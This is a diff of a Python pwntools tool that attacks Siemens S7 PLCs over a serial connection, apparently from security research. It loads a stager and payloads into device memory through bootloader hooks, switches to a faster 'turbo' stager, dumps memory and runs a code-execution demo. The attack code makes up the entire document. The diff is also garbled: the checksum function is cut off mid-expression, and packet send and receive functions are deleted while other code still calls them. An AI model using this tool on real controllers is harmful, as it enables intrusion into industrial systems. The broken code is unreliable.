@@ -9,7 +9,7 @@ import os
 import argparse
 from binascii import hexlify
 
-from pwn import remote, context, log, serialtube
+from pwn import remote, context, log, xor, serialtube
 
 context.update(log_level="info", bits=32, endian="big")
 
@@ -37,7 +37,6 @@ ANSW_INVALID_CHECKSUM = "\xff\x80\x03"
 ANSW_ENTER_SUBPROTO_SUCCESS = "\x80\x00"
 DEFAULT_STAGER_ADDHOOK_IND = 0x20
 DEFAULT_SECOND_ADD_HOOK_IND = 0x1a
-TURBO_STAGER_HOOK_IND = 0x19
 
 # Subprotocol handler constants
 SUBPROT_80_MODE_IRAM = 1
@@ -60,25 +59,7 @@ class SiemensS7Client:
         self.next_payload_location = FIRST_PAYLOAD_LOCATION
 
     def calc_checksum_byte(self, incoming):
-        return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]
-
-    def send_packet(self, msg, step=2, sleep_amt=0.01):
-        assert (len(msg) <= MAX_MSG_LEN)
-        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
-        msg = chr(len(msg) + 1) + msg
-        msg = msg + self.calc_checksum_byte(msg)
-        log.info("sending packet: {}".format(msg.encode("hex")))
-        for i in range(0, len(msg), step):
-            time.sleep(sleep_amt)
-            self.r.send(msg[i:i + step])
-
-    def recv_packet(self):
-        answ = self.r.recv(1)
-        if not answ:
-            log.error("Did not receive any data. Is the PLC connected?")
-            return None
-        rem = ord(answ)
-        while rem > 0:
+        return struct.pack(" 0:
             add = self.r.recv(rem)
             rem -= len(add)
             answ += add
@@ -131,7 +112,10 @@ class SiemensS7Client:
         self.recv_packet()
 
     def get_version(self):
-        return self.invoke_primary_handler(0)
+        # Keep target-branch fix: send then await response explicitly
+        self.invoke_primary_handler(0, await_response=False)
+        return self.recv_packet()
+
     def bye(self):
         self.invoke_primary_handler(0xa2)
         answ = self.recv_packet()
@@ -232,16 +216,16 @@ class SiemensS7Client:
     def switch_to_turbo_mode(self):
         """
         Perform turbo mode handshake and switch UART baud rate from 38400 to 115200.
-        
+
         Protocol:
         1. Wait for 0xAA from device (handshake initiator)
         2. Send 0x5F to device (confirmation)
         3. Switch local baud rate to 115200
         4. Verify speed change by exchanging 0xCC/0xDD with the device (see verify_turbo_speed())
-        
+
         Returns:
             bool: True if handshake successful, False otherwise
-        
+
         Note:
             After calling this method, you should call verify_turbo_speed() to complete the turbo mode protocol.
         """
@@ -255,11 +239,12 @@ class SiemensS7Client:
             return False
         log.info("Got initiator. Sending confirmation (0x5F) and switching baud rate.")
         self.r.send('\x5f')
-        if isinstance(self.r, serialtube):
-            self.r.baudrate = 115200
-            log.success("Switched to 115200 baud.")
+        # On pwntools serialtube, prefer set_baudrate if available, else assign
+        if hasattr(self.r, "set_baudrate"):
+            self.r.set_baudrate(115200)
         else:
-            log.warning("Not a serial connection; skipping baud rate switch.")
+            self.r.baudrate = 115200
+        log.success("Switched to 115200 baud.")
         return True
 
     def verify_turbo_speed(self):
@@ -279,14 +264,14 @@ class SiemensS7Client:
     def load_payload_turbo(self, payload, dest_addr):
         """
         Load a payload at high speed (115200 baud) via the turbo stager.
-        
+
         The turbo stager receives the payload, installs it at the specified
         address, and registers it as a hook handler.
-        
+
         Args:
             payload (str): Binary payload data to load
             dest_addr (int): Destination address in device memory where payload will be loaded
-            
+
         Returns:
             bool: True if payload loaded and installed successfully, False otherwise
         """
@@ -300,9 +285,9 @@ class SiemensS7Client:
         log.info("Sending payload...")
         self.r.send(payload)
         log.info("Waiting for 'Done' signal from stager...")
-        done_signal = self.r.recv(1, timeout=10)
+        done_signal = self.r.recv(1, timeout=3)
         if done_signal != 'D':
-            log.error("Did not receive 'Done' signal. Got {}.".format(hexlify(done_signal)))
+            log.error("Did not receive 'Done' signal. Got {}.".format(hexlify(done_signal) if done_signal is not None else done_signal))
             return False
         log.success("Payload loaded and installed successfully via turbo stager.")
         return True
@@ -322,63 +307,45 @@ class SiemensS7Client:
         log.info("Writing the initial stage took {} seconds".format(time.time() - start))
 
         payload = args.payload.read() if hasattr(args, 'payload') and args.payload else None
-        contents = None  # Initialize to track memory dump results
+        contents = None  # track memory dump results
 
-        if args.action == ACTION_DUMP_TURBO:
-            # Step 1: Install turbo_stager using the normal stager
-            # Use hook 0x19 for turbo_stager itself (not 0x1a, which turbo_stager will use for the final payload)
-            try:
-                with open(TURBO_STAGER_PL_FILENAME, 'rb') as f:
-                    turbo_stager_code = f.read()
-            except IOError as e:
-                log.error("Failed to open turbo stager file '{}': {}".format(TURBO_STAGER_PL_FILENAME, e))
-                self.bye()
+        # If turbo mode is enabled, chain-load the turbo stager and then the final payload
+        if args.turbo_stager:
+            log.info("--- TURBO MODE ENABLED ---")
+            turbo_stager_code = args.turbo_stager.read()
+
+            # 1. Install turbo_stager using the normal stager
+            log.info("Installing turbo_stager...")
+            turbo_stager_hook = self.install_addhook_via_stager(self.next_payload_location, turbo_stager_code, stager_addhook_ind, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND)
+
+            # 2. Invoke turbo_stager (non-blocking) to start handshake
+            self.invoke_add_hook(turbo_stager_hook, await_response=False)
+
+            # 3. Perform handshake and switch baud rate, then verify speed
+            if not self.switch_to_turbo_mode():
                 return
-            turbo_stager_addhook_ind = self.install_addhook_via_stager(
-                self.next_payload_location, 
-                turbo_stager_code, 
-                stager_addhook_ind,
-                TURBO_STAGER_HOOK_IND
-            )
-            log.info("Turbo stager installed at hook 0x{:02x}".format(turbo_stager_addhook_ind))
-            
-            # Remember where the dump_mem payload will be installed (not where we're dumping from)
-            payload_install_addr = self.next_payload_location
-            
-            # Step 2: Invoke turbo_stager - it will send 0xAA to initiate handshake
-            log.info("Invoking turbo stager to switch to turbo mode...")
-            self.invoke_add_hook(turbo_stager_addhook_ind, await_response=False)
-            
-            # Step 3: Respond to handshake from turbo_stager and switch baud rate
-            if not self.switch_to_turbo_mode(): 
-                self.bye()
-                return
-            
-            # Step 4: Verify communication at 115200 baud (send 0xCC, receive 0xDD)
             if not self.verify_turbo_speed():
-                self.bye()
                 return
-            
-            # Step 5: Send the dump_mem payload via turbo mode
-            # The turbo_stager will receive it, install it at hook 0x1a, and send 'D'
-            if payload is None:
-                log.error("No payload loaded to send via turbo mode.")
-                self.bye()
+
+            # 4. Load the final payload (e.g., dump_mem) at high speed
+            if not self.load_payload_turbo(payload, self.next_payload_location):
                 return
-            if not self.load_payload_turbo(payload, payload_install_addr):
-                self.bye()
-                return
-            
-            # Step 6: Dump memory using the payload installed by turbo_stager at hook 0x1a
-            log.info("Dumping memory...")
-            contents = self.payload_dump_mem(args.address, args.length, DEFAULT_SECOND_ADD_HOOK_IND)
+
+            # The final payload is now installed at the same hook index as the turbo_stager
+            second_addhook_ind = turbo_stager_hook
+
+        # If not turbo mode, just load the payload normally
         else:
             if payload is not None:
                 start = time.time()
                 second_addhook_ind = self.install_addhook_via_stager(self.next_payload_location, payload, stager_addhook_ind)
                 log.info("Installing the additional hook took {} seconds".format(time.time() - start))
+            else:
+                second_addhook_ind = None
 
-            # --- Execute action for non-turbo modes ---
+        # --- Execute final action ---
+        # This part is now common for both turbo and normal mode
+        if second_addhook_ind is not None:
             if args.action == ACTION_INVOKE_HOOK:
                 answ = self.invoke_add_hook(second_addhook_ind, args.args)
                 log.info("Got answer: {}".format(answ))
@@ -391,8 +358,10 @@ class SiemensS7Client:
             elif args.action == ACTION_HELLO_LOOP:
                 self.invoke_add_hook(second_addhook_ind, await_response=False)
                 while True:
-                    packet = self.recv_packet()
-                    log.info("Got packet: {}".format(packet))
+                    pkt = self.recv_packet()
+                    if pkt is None:
+                        break
+                    log.info("Got packet: {}".format(pkt))
             elif args.action == ACTION_TIC_TAC_TOE:
                 log.info("[*] Demonstrating Code Execution")
                 self.invoke_add_hook(second_addhook_ind, await_response=False)
@@ -400,16 +369,21 @@ class SiemensS7Client:
                 END_TOKEN = "==>"
                 while END_TOKEN not in msg:
                     msg = self.recv_packet()
+                    if msg is None:
+                        break
                     sys.stdout.write(msg)
                     sys.stdout.flush()
                     if "enter a number" in msg:
                         choice = raw_input()
                         self.send_packet(choice[0])
                 log.info("[*] Done here!")
+        else:
+            log.warning("No payload/hook installed; skipping action execution.")
 
         if contents:
             out_filename = args.outfile if hasattr(args, 'outfile') and args.outfile else "mem_dump_{:08x}_{:08x}".format(args.address, args.address + args.length)
-            with open(out_filename, "wb") as f: f.write(contents)
+            with open(out_filename, "wb") as f:
+                f.write(contents)
             log.success("Wrote {} bytes to {}".format(len(contents), out_filename))
 
         log.info("Saying bye...")
@@ -445,30 +419,29 @@ def main():
     # Arguments for invoke
     parser_invoke_hook.add_argument('-p', '--payload', type=argparse.FileType('rb'), required=True)
     parser_invoke_hook.add_argument('-a', '--args', default="", nargs='+')
-    parser_invoke_hook.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME)
+    parser_invoke_hook.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)
 
     # Arguments for dump
     for p in [parser_dump, parser_dump_turbo]:
-        stager_default = STAGER_PL_FILENAME
-        p.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=stager_default)
         p.add_argument('-p', '--payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
         p.add_argument('-a', '--address', type=lambda x: int(x, 0), required=True)
         p.add_argument('-l', '--length', type=lambda x: int(x, 0), required=True)
         p.add_argument('-o', '--out-file', dest='outfile', default=None)
 
     # Specific stager for turbo mode, but available for all commands
+    parser.add_argument('--turbo-stager', type=argparse.FileType('rb'), default=None, help='Specify the turbo stager to enable high-speed mode for any command.')
 
     # Arguments for test
-    parser_test.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME)
-    parser_test.add_argument('-p', '--payload', type=argparse.FileType('rb'), default="payloads/hello_world/hello_world.bin")
+    parser_test.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)
+    parser_test.add_argument('-p', '--payload', type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin")
     
     # Arguments for hello_loop
-    parser_hello_loop.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME)
-    parser_hello_loop.add_argument('-p', '--payload', type=argparse.FileType('rb'), default="payloads/hello_loop/build/hello_loop.bin")
+    parser_hello_loop.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)
+    parser_hello_loop.add_argument('-p', '--payload', type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin")
 
     # Arguments for tictactoe
-    parser_tictactoe.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME)
-    parser_tictactoe.add_argument('-p', '--payload', type=argparse.FileType('rb'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin")
+    parser_tictactoe.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)
+    parser_tictactoe.add_argument('-p', '--payload', type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin")
 
     args = parser.parse_args()
 
@@ -507,7 +480,6 @@ def main():
                 r.unrecv(answ)
                 client.handle_connection(args)
                 break
-        # Add a periodic small delay every 10 attempts to avoid overwhelming the device
         if i % 10 == 9:
             time.sleep(0.1)
     else:
